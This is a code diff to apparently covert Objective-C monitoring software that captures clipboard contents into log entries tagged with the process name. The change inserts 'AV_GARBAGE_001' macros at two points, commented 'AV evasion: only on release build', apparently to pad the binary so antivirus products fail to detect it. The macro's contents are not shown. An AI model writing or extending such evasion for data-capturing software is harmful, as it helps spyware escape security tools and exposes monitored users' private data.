@@ -46,6 +46,9 @@
       NSString *dataString = [[NSString alloc] initWithData: data
                                                    encoding: NSUTF8StringEncoding];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       NSMutableData *clipboardContent = [[NSMutableData alloc] initWithData:
                                          [dataString dataUsingEncoding:
                                           NSUTF16LittleEndianStringEncoding
@@ -56,6 +59,9 @@
       
       NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
       NSMutableData *entryData = [[NSMutableData alloc] init];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
       
       NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
       NSString *_processName      = [[processInfo processName] copy];
